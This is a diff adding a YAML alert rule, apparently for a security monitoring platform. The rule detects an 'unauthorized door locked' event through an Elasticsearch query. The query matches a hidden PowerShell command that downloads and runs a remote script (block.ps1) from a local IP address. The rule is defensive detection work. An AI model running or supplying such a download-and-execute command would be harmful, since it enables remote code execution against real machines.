@@ -1,0 +1,22 @@
+category: attack
+ciaLevel: availability
+component: SI
+eventId: '215'
+eventType: alert
+impact: ''
+keys: '{"src":{"en":"Source Address", "zh":"源地址"}}'
+name: Unauthorized Door Locked
+nameCN: 非授权门禁锁定
+parseEsResultKeys: ''
+redisEventKey: event-ts-unauthorized-door-locked
+remarkCN: 未授权主机 {src} 锁定门禁设备
+remarks: Door Locked from unauthorized host {src}.
+ruleType: '1'
+script: '{"query":{"bool":{"must":[{"range":{"@timestamp":{"gt":"<bt>","lt":"<et>"}}},{"match_phrase":{"CommandLine":"powershell
+  -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(''http://192.168.1.20:8000/block.ps1'');"
+  }}]}},"size":1000}'
+source: network
+status: 0
+tags: ''
+threshold: 1
+timeWindow: 120000
